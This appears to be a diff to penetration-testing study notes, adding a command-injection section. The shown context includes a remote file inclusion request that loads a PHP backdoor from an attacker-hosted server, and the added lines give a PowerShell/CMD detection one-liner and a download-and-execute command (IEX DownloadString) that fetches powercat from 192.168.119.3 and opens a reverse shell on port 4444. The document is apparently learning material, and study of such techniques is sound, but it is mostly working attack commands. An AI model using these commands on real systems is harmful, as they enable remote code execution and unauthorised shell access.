@@ -177,3 +177,20 @@ cat simple-backdoor.php
 python3 -m http.server 80
 
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"```
+
+## Command Injection
+
+Determine if our commands are executed by PowerShell or CMD
+```powershell
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+Powercat is a PowerShell implementation of Netcat included in Kali
+```shell
+cat /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
+```
+**-c** to specify where to connect, **-p** for the port, and **-e** for executing a program.
+```Powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+```
+
